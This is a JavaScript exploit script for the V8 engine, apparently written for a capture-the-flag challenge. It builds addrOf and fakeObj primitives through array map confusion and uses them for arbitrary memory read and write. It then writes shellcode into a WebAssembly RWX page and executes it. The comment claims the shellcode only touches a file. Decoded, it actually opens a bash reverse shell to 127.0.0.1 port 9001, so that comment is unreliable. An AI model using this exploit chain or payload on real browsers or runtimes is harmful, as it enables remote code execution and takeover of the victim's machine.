// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);

/**
  * Float to Integer
  * in: Float (ex: 2.2)
  * out: Unsigned Int 
*/
function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n); // Watch for little endianness
}

/**
  * Integer to Float
  * in: Unsigned Int
  * out: Float (ex: 2.2) 
*/
function itof(val) { // typeof(val) = BigInt
    u32_buf[0] = Number(val & 0xffffffffn);
    u32_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

/**
  * To hex
  * in: Float (ex: 2.2)
  * out: 0xbaddbeef
*/
function ftoh(val) {
  return "0x" + ftoi(val).toString(16);
}

// important primitives
function addrOf(obj_to_leak) {
  // create float array
  arr = [1.1];
  // convert to object array
  arr.SetLastElement(obj_map);
  // put obj to leak in possition
  arr[0] = obj_to_leak;
  arr.SetLastElement(float_map);
  // grab address
  let leak = arr[0];
  arr.SetLastElement(obj_map);
  return (ftoi(leak) & 0xffffffffn);
}

function fakeObj(addr) {
  arr = [1.1];
  arr[0] = itof(addr);
  arr.SetLastElement(obj_map);
  let fake = arr[0];
  arr.SetLastElement(float_map);
  return fake;
}

function read(addr) {
  if(addr % 2n == 0) {
    addr += 1;
  }

  fake_arr[1] = itof((8n << 32n) + addr - 8n);
  return fake[0];
}

function write(addr, val) {
  if(addr % 2n == 0) {
    addr += 1;
  }
  fake_arr[1] = itof((8n << 32n) + addr - 8n);
  fake[0] = itof(BigInt(val));
}

// start exploit

var tmp_obj = {"A": 1};
var obj_arr = [tmp_obj];
var float_arr = [1.1, 1.2, 1.3];
var float_map = float_arr.GetLastElement();
var obj_map = itof(ftoi(float_map) + 0x50n);

console.log("[+] Float  Map: " + ftoh(float_map));
console.log("[+] Object Map: " + ftoh(obj_map));

var fake_arr = [float_map, 1.1, 1.2, 1.3];
var fake = fakeObj(addrOf(fake_arr) - 0x20n);

// https://wasdk.github.io/WasmFiddle/
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var wasm_exec_shellcode = wasm_instance.exports.main;

console.log("[+] Found pointer to wasm instance: 0x" + addrOf(wasm_instance).toString(16))
var rwx_page_addr = ftoi(read(addrOf(wasm_instance) + 0x68n));
console.log("[+] Found pointer to rwx page: 0x" + addrOf(rwx_page_addr).toString(16))

function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrOf(buf);
    let backing_store_addr = buf_addr + 0x14n;
    write(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4*i, shellcode[i], true);
    }
}

// msfvenom -p linux/x64/exec CMD='/usr/bin/touch /tmp/executed_baby' --format dword
var shellcode = [0x622fb848, 0x732f6e69, 0x50990068, 0x66525f54, 0x54632d68, 0x37e8525e, 0x2f000000, 0x2f6e6962, 
0x68736162, 0x20632d20, 0x73616222, 0x692d2068, 0x20263e20, 0x7665642f, 0x7063742f, 0x3732312f, 
0x302e302e, 0x392f312e, 0x20313030, 0x31263e30, 0x57560022, 0x3b6a5e54, 0x00050f58];
copy_shellcode(rwx_page_addr, shellcode);

console.log("[+] WASM instance - OK");
console.log("[+] Shellcode - OK");
console.log("[+] Read/write/exec - OK");

console.log("[*] Running shellcode...");
wasm_exec_shellcode();
